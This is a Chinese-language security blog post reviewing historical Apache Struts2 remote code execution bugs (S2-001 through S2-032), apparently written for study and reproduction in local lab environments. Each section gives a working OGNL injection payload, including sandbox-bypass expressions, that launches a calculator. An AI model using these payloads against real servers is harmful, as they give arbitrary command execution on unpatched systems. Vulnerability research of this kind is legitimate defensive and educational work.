---
layout: post
title: Struts2 历史 RCE 漏洞回顾不完全系列
tags: [web, java, security]
---

刚爆出 Struts2 远程命令执行 S2-032 的时候让我有点心无力，作为一名安全研究员还是不能偷懒，经典漏洞还是应该去分析回顾一下的。

如果你想看的是详细的底层代码跟踪分析，那我也只能 say sorry 了。能力有限一些细节无法很好的写在这里，因为确实太多了 QWQ。这里只是对 ST2 历史 RCE 漏洞的一个回顾，同时也希望对这些有漏洞有疑惑或者和我一样曾经对它感到吃力的人带来一点点帮助。所有文中所提漏洞的测试环境 WAR 包附后，想要自己进行复现测试或者查看漏洞起因关键代码的同学可以下载下来跟着文章实践一下。

已经完成：S2-001, S2-007, S2-008, S2-012, S2-013, S2-015, S2-016, S2-029, S2-32 （WAR 包集合 [http://pan.baidu.com/s/1nvfDDdZ](http://pan.baidu.com/s/1nvfDDdZ):tdb8）

未完成：S2-003, S2-005, S2-009, S2-020, S2-021, S2-022

（前方高能，一大波 “计算器” 即将来临）

### S2-001

> 官方链接：[https://struts.apache.org/docs/s2-001.html](https://struts.apache.org/docs/s2-001.html)
> 
> 影响版本：Struts 2.0.0 - Struts 2.0.8
> 
> 修复摘要：数据 re-display 时禁止执行 OGNL 表达式

该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 `%{value}` 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 `%{value}` 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行：

    %{@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")}
    
![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/1.png)

### S2-007

> 官方链接：[https://struts.apache.org/docs/s2-007.html](https://struts.apache.org/docs/s2-007.html)
>
> 影响版本：Struts 2.0.0 - Struts 2.2.3
> 
> 修复摘要：在转换的过程中进行字符过滤
> 
> 修复补丁：[https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892](https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892)

当配置了验证规则 `<ActionName>-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 `UserAction`：

```java
(...)
public class UserAction extends ActionSupport {
	private Integer age;
	private String name;
	private String email;

(...)
```

然后配置有 `UserAction-validation.xml`：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE validators PUBLIC
	"-//OpenSymphony Group//XWork Validator 1.0//EN"
	"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
<validators>
	<field name="age">
		<field-validator type="int">
			<param name="min">1</param>
			<param name="max">150</param>
		</field-validator>
	</field>
</validators>
```

当用户提交 `age` 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。

因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload：

    ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '

![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/4.png)

### S2-008

> 官方链接：[https://struts.apache.org/docs/s2-008.html](https://struts.apache.org/docs/s2-008.html)
> 
> 影响版本：Struts 2.1.0 - Struts 2.3.1
> 
> 修复摘要：添加参数名和 Cookie 名白名单 acceptedParamNames = "[a-zA-Z0-9\.][()_']+";

S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 `devMode` 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。

例如在 `devMode` 模式下直接添加参数 `?debug=command&expression=<OGNL EXP>` 会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：

    http://localhost:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)

![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/5.png)

### S2-012

> 官方链接：[https://struts.apache.org/docs/s2-012.html](https://struts.apache.org/docs/s2-012.html)
>
> 影响版本：Struts 2.0.0 － Struts 2。3.13
> 
> 修复摘要：默认禁用 OGNLUtil 类的 OGNL 表达式执行

如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 `${param_name}` 作为重定向变量，例如：

```xml
	<package name="S2-012" extends="struts-default">
		<action name="user" class="com.demo.action.UserAction">
			<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
			<result name="input">/index.jsp</result>
			<result name="success">/index.jsp</result>
		</action>
	</package>
```

这里 `UserAction` 中定义有一个 `name` 变量，当触发 `redirect` 类型返回时，Struts2 获取使用 `${name}` 获取其值，在这个过程中会对 `name` 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行：

    http://localhost:8080/S2-012/user.action?name=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D
    
![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/6.png)

### S2-013 | S2-014

> 官方链接：[https://struts.apache.org/docs/s2-013.html](https://struts.apache.org/docs/s2-013.html), [https://struts.apache.org/docs/s2-014.html](https://struts.apache.org/docs/s2-014.html)
> 
> 影响版本：Struts 2.0.0 - Struts 2.3.14 (Struts 2.3.14.1)
> 
> 修复摘要：在对标签进行请求参数操作时禁用 OGNL 表达式解析

Struts2 标签中 `<s:a>` 和 `<s:url>` 都包含一个 `includeParams` 属性，其值可设置为 `none`，`get` 或 `all`，参考官方其对应意义如下：

1. none - 链接不包含请求的任意参数值（默认）
2. get - 链接只包含 GET 请求中的参数和其值
3. all - 链接包含 GET 和 POST 所有参数和其值

若设置了 `includeParams="get"` 或者 `includeParams="all"`，在获取对应类型参数时后端会对参数值进行 OGNL 表达式解析，因此可以插入任意 OGNL 表达式导致命令执行：

    http://localhost:8080/S2-013/link.action?xxxx=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D
    
![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/7.png)

S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 `${ognl_exp}` OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强。

    http://localhost:8080/S2-013/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D

### S2-015

> 官方链接：[https://struts.apache.org/docs/s2-015.html](https://struts.apache.org/docs/s2-015.html)
> 
> 影响版本：Struts 2.0.0 - Struts 2.3.14.2
> 
> 修复摘要：针对 Action 名称进行默认字符限制 [a-z]*[A-Z]*[0-9]*[.\-_!/]* 

漏洞产生于配置了 Action 通配符 `*`，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：

```xml
	<package name="S2-015" extends="struts-default">
		<action name="*" class="com.demo.action.PageAction">
			<result>/{1}.jsp</result>
		</action>
	</package>
```

上述配置能让我们访问 `name.action` 时使用 `name.jsp` 来渲染页面，但是在提取 `name` 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 `name` 值的位置比较特殊，一些特殊的字符如 `/` `"` `\` 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。

还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 `SecurityMemberAccess` 类中的 `setAllowStaticMethodAccess` 方法，因此在 2.3.14.2 版本以后都不能直接通过 `#_memberAccess['allowStaticMethodAccess']=true` 来修改其值达到重获静态方法调用的能力。

这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 `(new java.lang.ProcessBuilder('calc')).start()` 来解决，另外还可以借助 Java 反射机制去间接修改：

    #context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true)
    
可以构造 Payload 如下：

```
    http://localhost:8080/S2-015/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('calc')}.action
```

![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/8.png)

除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：

```xml
		<action name="param" class="com.demo.action.ParamAction">
			<result name="success" type="httpheader">
			  	<param name="error">305</param>
  				<param name="headers.fxxk">${message}</param>
			</result>
		</action>
```

这里配置了 `<param name="errorMessage">${message}</param>`，其中 `message` 为 `ParamAction` 中的一个私有变量，这样配置会导致触发该 Result 时，Struts2 会从请求参数中获取 `message` 的值，并在解析过程中，触发了 OGNL 表达式执行，因此只用提交 `%{1111*2}` 作为其变量值提交就会得到执行。这里需要注意的是这里的二次解析是因为在 `struts.xml` 中使用 `${param}` 引用了 Action 中的变量所导致的，并不针对于 `type="httpheader"` 这种返回方式。

![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/9.png)

### S2-016

> 官方链接：[https://struts.apache.org/docs/s2-016.html](https://struts.apache.org/docs/s2-016.html)
> 
> 影响版本：Struts 2.0.0 - Struts 2.3.15
> 
> 修复摘要：删除 "action:"，"redirect:"，"redirectAction:" 这些前置前缀调用

`DefaultActionMapper` 类支持以 `action:`，`redirect:` 和 `redirectAction:` 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行，经测试发现 `redirect:` 和 `redirectAction:` 这两个前缀比较好容易构造出命令执行的 Payload（转义后）：

```
    http://localhost:8080/S2-016/default.action?redirect:${%23context['xwork.MethodAccessor.denyMethodExecution']%3Dfalse,%23f%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open%20%2fApplications%2fCalculator.app')}
    
    或者
    
    http://localhost:8080/S2-016/default.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'open','/Applications/Calculator.app'})).start()}
```

![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/10.png)

### S2-029

> 官方链接：[https://struts.apache.org/docs/s2-029.html](https://struts.apache.org/docs/s2-029.html)
> 
> 影响版本：Struts 2.0.0 - Struts 2.3.16
> 
> 修复摘要：限制传入标签属性的值，对其进行合规的正则验证

简单的说就是当开发者在模版中使用了类似如下的标签写法时，后端 Struts2 处理时会导致二次 OGNL 表达式执行的情况：

```
<s:textfield name="%{message}"></s:textfield>
```

这里需要注意的是，仅当只有 `name` 属性这样写的情况下才能触发 OGNL 表达式执行，并且该标签中不能显示写有 `value` 属性。详细分析可参考天融信阿尔法实验室的张萌所写的[《struts2漏洞s2-029分析》](http://blog.topsec.com.cn/ad_lab/struts2漏洞s2-029分析/)

到 S2-029 这里是，Struts2 已经增加了相当多的安全检测了，所以想要直接执行命令还需要通过修改这些安全参数来绕过最后的执行检测，具体的安全参数版本差异同样可参考上面的详细分析文章。

下面测试环境使用的是 `Struts 2.3.24.1`：

    http://localhost:8080/S2-029/default.action?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app'))

![](/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/12.png)

（前面提到在 S2-015 Struts 2.3.14.2 中已经删除了 `setAllowStaticMethodAccess` 方法导致无法直接赋值，但是在该测试环境中却又可以直接对 `_memberAccess['allowStaticMethodAccess']` 进行赋值了，表示有点疑惑，希望有明白的同学告知我一下）

### S2-032

> 官方链接：[https://struts.apache.org/docs/s2-032.html](https://struts.apache.org/docs/s2-032.html)
> 
> 影响版本：Struts 2.3.20 - Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)
> 
> 修复摘要：过滤通过 method: 传入的 action 名称，限制其字符范围 protected Pattern allowedActionNames = Pattern.compile(“[a-zA-Z0-9._!/\\-]*”);

在配置了 Struts2 DMI 为 True 的情况下，可以使用 `method:<name>` Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（[Dynamic Method Invocation](https://struts.apache.org/docs/action-configuration.html#ActionConfiguration-DynamicMethodInvocation)），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 `name` 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - [《Apache Struts2 s2-032技术分析及漏洞检测脚本》](http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/)

要成功利用必须要开 DMI 才可以：

```xml
<constant name="struts.enable.DynamicMethodInvocation" value="true" />
```

找到目标应用有效的 Action 例如 `index.action`，那么直接使用 DMI 在 `method:` 后面带上需要执行 OGNL 表达式即可（注意转义）：

    http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23f%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%2C%23f.close&cmd=open%20%2fApplications%2fCalculator.app

这里需要注意的是后端会获取 `name` 值后拼接 `"()"` 形成 `name()` 然后再去执行 OGNL 表达式。

（在测试的时候，对比了前后几个版本的 Payload，发现这里并不用去修改什么安全参数就能够执行命令了，我表示对此有点不解。并且在公开的 PoC 中出现了 `#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` 这个表达式，如果不附上会因为字符检查而执行失败，这一点是为了绕沙盒，但具体代码细节还是不太清楚）

### 比较关键的 OGNL 表达式

获取当前请求参数值（e.g. `http://www.example.com/index.action?a=222&b=333`）：

    #parameters.a[0]  // a = 222
    
获取当前 Response 对象，用于输出字符串到当前访问页面：

    #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println("HelloWorld!"),#response.flush(),#response.close()
    
利用 Java 反射机制修改 `#_memberAccess['allowStaticMethodAccess']`：

    #context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true)

### 参考

* [http://www.cnblogs.com/LittleHann/p/4606891.html](http://www.cnblogs.com/LittleHann/p/4606891.html)
* [http://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/](http://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/)
* [http://drops.wooyun.org/papers/902](http://drops.wooyun.org/papers/902)
* [http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032技术分析及漏洞检测脚本/](http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032技术分析及漏洞检测脚本/)
